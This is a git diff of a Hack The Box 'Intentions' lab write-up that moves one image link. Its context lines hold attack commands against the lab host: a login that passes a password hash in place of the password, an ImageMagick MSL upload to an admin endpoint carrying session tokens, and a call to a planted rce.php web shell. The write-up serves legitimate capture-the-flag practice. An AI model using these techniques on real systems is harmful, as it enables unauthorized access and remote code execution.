@@ -107,8 +107,6 @@ curl -X POST http://intentions.htb/api/v1/auth/login
 ```
 curl -d 'email=steve@intentions.htb&hash=$2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twa' -X POST http://intentions.htb/api/v2/auth/login
 ```
-![image](https://github.com/user-attachments/assets/c1428800-193b-4f62-98b3-420cba7a5f4e)
-
 ![image](https://github.com/regarmulia/HTB/assets/33616880/a740f795-07cd-49c5-b0fa-4cba7ec0a070)
 
 
@@ -154,6 +152,8 @@ http://intentions.htb/api/v2/admin/image/modify
 curl 'http://intentions.htb/api/v2/admin/image/modify' -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0=' -H 'Cookie: XSRF-TOKEN=eyJpdiI6IjYxcmJueWtFTTNib0FFOXlnUTdFL1E9PSIsInZhbHVlIjoibGRsUUgzWmhaSVpjaDNwcEJ4QXBFQ29XRnlSUHhwdE4zMXdsN2ZUbTFPREt2dmUyRHdGRzlhWS94bGFEU0xZTk9TNjlDVENIUnlYbDEwTzFWZzcxWk40dUZ0VGJLNmtBQmhTVEVnMkFlSUl2M2thbGU5eEZDdTh2NkNvcTV5SEciLCJtYWMiOiI1OWIwZDFkOTc3OWJjZWZhNDkzYTNhMTYyMjIwNGZmZmJjY2NkZGI5ODdlODVlY2U2OTU5ZGU0MmFiNTE2NTM4IiwidGFnIjoiIn0%3D; intentions_session=eyJpdiI6ImVySlh1ZmlzOC9vRXdPaTRHK1A1RHc9PSIsInZhbHVlIjoicitCaW9NTDZNdnBzeVduN0dHek1Gd2gzMHV4ZmxFem9iOEZqUnJRUkg0YWhrdHIxNC9reU5pc3Z3LzhpeUNUdm5HMWhjSFZBZGowTnBvVVNzMnZPbTJGcHRIT205OUxIK2M4Z0RTeTFrVWpnQXlERU1ZOHlEUW9xbWZBV1pKZFQiLCJtYWMiOiJhMzg5NTdhOTQ0NjYwMjNhMWYyNThhYmM2NjljZmNhYWY0NTYzMWMwZGRiY2ZlZjQwYjAyN2Q3NTFmNWMwYWVhIiwidGFnIjoiIn0%3D; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vaW50ZW50aW9ucy5odGIvYXBpL3YyL2F1dGgvbG9naW4iLCJpYXQiOjE3MTYzNjE1MTEsImV4cCI6MTcxNjM4MzExMSwibmJmIjoxNzE2MzYxNTExLCJqdGkiOiJZbGVJc0NkWnAzZXc0NWc2Iiwic3ViIjoiMSIsInBydiI6IjIzYmQ1Yzg5NDlmNjAwYWRiMzllNzAxYzQwMDg3MmRiN2E1OTc2ZjcifQ.Y-yF7_2agtJjTqtFeEThuabmwzTvhDCFoq6tHt0l3zc' -F 'path=vid:msl:/tmp/php*' -F 'effect=asd' -F file=@payload.msl
 http://intentions.htb/storage/rce.php?c=ls
 ```
+![image](https://github.com/user-attachments/assets/c1428800-193b-4f62-98b3-420cba7a5f4e)
+
 ![image](https://github.com/regarmulia/HTB/assets/33616880/c9c6203b-fe5d-4877-ac23-646845ae13ff)
 
 
